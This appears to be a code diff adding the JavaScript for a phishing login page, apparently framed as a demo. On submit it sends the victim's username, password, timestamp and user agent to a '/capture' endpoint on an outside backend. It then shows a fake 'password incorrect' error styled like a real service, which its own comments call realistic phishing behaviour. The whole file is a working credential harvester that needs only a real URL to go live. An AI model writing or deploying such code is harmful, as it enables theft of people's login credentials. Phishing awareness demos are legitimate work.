@@ -1,0 +1,45 @@
+const API_URL = 'https://your-backend-url.onrender.com'; // Your deployed backend URL
+
+document.getElementById('demoForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    try {
+        const response = await fetch(`${API_URL}/capture`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username,
+                password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
+        });
+        
+        const result = await response.json();
+        
+        // Show "fake error" to user (realistic phishing behavior)
+        document.querySelector('.login-box').innerHTML = `
+            <div style="padding: 40px 20px;">
+                <p style="color: #ed4956; font-size: 14px; margin-bottom: 20px;">
+                    Sorry, your password was incorrect. Please double-check your password.
+                </p>
+                <button onclick="location.reload()" style="width:100%; padding:8px; background:#0095f6; color:white; border:none; border-radius:8px; cursor:pointer;">
+                    Try Again
+                </button>
+            </div>
+        `;
+        
+        // Log to console for demo purposes
+        console.log('🎣 Data sent to attacker server:', result);
+        
+    } catch (err) {
+        console.error('Demo error:', err);
+        // Fallback: show local result if backend is down
+        document.getElementById('capturedUser').textContent = username;
+        document.getElementById('capturedPass').textContent = '*'.repeat(password.length);
+        document.getElementById('demoResult').style.display = 'block';
+    }
+});
